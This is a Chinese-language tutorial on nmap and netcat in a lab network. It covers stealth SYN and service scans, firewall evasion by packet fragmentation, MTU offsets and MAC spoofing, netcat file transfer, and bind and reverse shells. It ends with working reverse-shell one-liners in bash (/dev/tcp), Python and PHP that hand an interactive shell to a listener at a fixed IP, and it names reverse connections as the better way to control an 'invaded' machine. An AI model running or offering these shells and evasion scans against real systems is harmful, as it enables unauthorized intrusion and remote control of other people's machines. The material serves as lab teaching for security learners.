## **nmap和nc的使用**

###  **nmap的使用**

1\. nmap -sSV 172.16.100.214 -T4 -F

[![wps14](https://image.3001.net/images/20201115/1605443939.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105107807-1152944390.jpg)

-sS进行SYN扫描，是比较隐匿的

-sV探测打开端口的服务的信息

-sSV将上面两种一起使用

-T4 扫描的速度（0-5）

2\. nmap -sSV 172.16.100.214 -T4 -F -vv -vv详细信息

[![wps15](https://image.3001.net/images/20201115/1605443940.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105108817-1307062394.jpg)

3\. nmap -sSV 172.16.100.214 -T4 -p 445 -p指定端口扫描（这里不能和-F一起使用）

[![wps16](https://image.3001.net/images/20201115/1605443941.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105109686-1590217556.jpg)

4\. nmap -sSV 172.16.100.214/24 -T4 -F -Pn -Pn将所有主机当成存活进行端口探测(推荐使用)

[![wps17](https://image.3001.net/images/20201115/1605443941.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105110644-16124204.jpg)

5\. nmap -Pn 172.16.100.0/24 -T4 -A -A综合扫描

[![wps18](https://image.3001.net/images/20201115/1605443942.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105111532-845433250.jpg)

防火墙逃逸

6\. nmap -sSV 172.16.100.209 -T4 -f -v -f报文分段

[![wps19](https://image.3001.net/images/20201115/1605443943.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105112530-1170224901.jpg)[![wps20](https://image.3001.net/images/20201115/1605443944.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105113511-767101861.jpg)

7\. nmap -sSV 172.16.100.209 -T4 --mtu 16 --mtu偏移量

[![wps21](https://image.3001.net/images/20201115/1605443945.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105114613-596679143.jpg)

8\. nmap -sT -Pn --spoof-mac 0 172.16.100.209 --spoof-mac
mac地址欺骗（0是指随机生成mac地址）

[![wps22](https://image.3001.net/images/20201115/1605443946.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105115530-1125971234.jpg)

9\. nmap 172.16.100.214 -oN d:\1.txt -oN将输出信息保存正在指定位置

[![wps23](https://image.3001.net/images/20201115/1605443947.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105116416-929514198.jpg)

  

###  **nc（netcat）的使用**

1\. **端口探测**

[![wps24](https://image.3001.net/images/20201115/1605443947.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105117063-948990972.jpg)

nc 192.168.227.128 -znv 80

-z 零输入输出模式（用于端口扫描）

-n 只允许数字地址

-v|vv 详细信息|超详细信息  
  
---  
  
2\. **文件传输**

客户端发送文件给服务端

开始监听4444端口，并创建1.txt文件用于接收客户端发来文件

[![wps25](https://image.3001.net/images/20201115/1605443948.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105117725-1644217052.jpg)

客户端进行发送

[![wps26](https://image.3001.net/images/20201115/1605443949.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105118402-1202171724.jpg)

这时候服务端就会显示连接的客户端

[![wps27](https://image.3001.net/images/20201115/1605443949.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105119034-1052008385.jpg)

[![wps28](https://image.3001.net/images/20201115/1605443950.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105119646-852714692.jpg)

服务端发送文件给客户端

[![wps29](https://image.3001.net/images/20201115/1605443951.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105120323-1410581450.jpg)

[![wps30](https://image.3001.net/images/20201115/1605444651.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105120902-1590732697.jpg)

[![wps31](https://image.3001.net/images/20201115/1605443952.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105121591-1956674875.jpg)

服务端

nc -lvvp 4444 > 1.txt

-l 监听

-vv 超详细信息

-p port端口

-q 1 #按键ctrl+d 发送EOF 立即断开

客户端

C:\Users\ZJW\Desktop\netcat\nc64.exe 192.168.227.129 4444 < 33.txt

（这边的前面是调用nc64.exe）

<当指向port 就想将文件进行传输过去 >就是将文件保存到xx位置

这里我把端口当成一个存取站点，服务端就是站长，客户端所带ip就是站点地址，客户端把33.txt文件存到了4444端口然后服务端把这个文件的内容放到1.txt里面。

反之就是服务端把东西放在站点，客户端来到站点取东西。

（东西放在哪就要到哪里去取）  
  
---  
  
3\. **反弹shell**

 **目的是将kali下的shell文件弹到win7上，最终的效果是win7上使用命令操控kali**

正向反弹shell

服务端到客户端

这个时候入侵的win7是作为客户端，kali作为服务端

[![wps32](https://image.3001.net/images/20201115/1605443953.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105122347-152696624.jpg)

[![wps33](https://image.3001.net/images/20201115/1605444652.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105122935-812625763.jpg)

这时候就成功在win7上操作kali了

nc -lvvp 7777 -e /bin/bash 目标机kali 服务端

nc64.exe 192.168.227.129 7777 操作机win7 客户端

这里需要目标机的ip地址  
  
---  
  
反向反弹shell

客户端到服务端

此时win7作为服务端，kali作为客户端

[![wps34](https://image.3001.net/images/20201115/1605444652.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105123552-1676366415.jpg)[![wps35](https://image.3001.net/images/20201115/1605443954.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105124166-1459712088.jpg)[![wps36](https://image.3001.net/images/20201115/1605443955.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105124809-1407093381.jpg)

nc 192.168.227.128 7777 -e /bin/bash 目标机kali 客户端

nc64.exe -lvvp 7777 操作机win7 服务端

这里操作机就不用目标机的ip地址  
  
---  
  
 **总结**

反向连接反弹shell会更好，因为他不需要目标机器的ip地址，因为这时候操作机是服务端所以也不用考虑目标机的端口号防火墙的问题。

nc反弹shell的其他方式

1\. bash方式

[![wps37](https://image.3001.net/images/20201115/1605443956.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105125571-1696784431.jpg)

[![wps38](https://image.3001.net/images/20201115/1605443957.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105126298-437338616.jpg)

bash -i >& /dev/tcp/192.168.227.129/4444 0>&1

-i 打开一个交互的bash

>& 将标准错误输出重定向到标准输出

0>&1 将标准输入转化为标准输出  
  
---  
  
2\. python

[![wps39](https://image.3001.net/images/20201115/1605443957.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105126906-176345915.jpg)

[![wps40](https://image.3001.net/images/20201115/1605443958.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105127583-161563999.jpg)

python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.227.129",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
  
---  
  
3\. php

[![wps41](https://image.3001.net/images/20201115/1605444653.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105128155-1875545166.jpg)

[![wps42](https://image.3001.net/images/20201115/1605443959.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105128676-136538544.jpg)

php -r '$sock=fsockopen("192.168.227.129",4444);exec("/bin/sh -i <&3 >&3
2>&3");'  
  
---
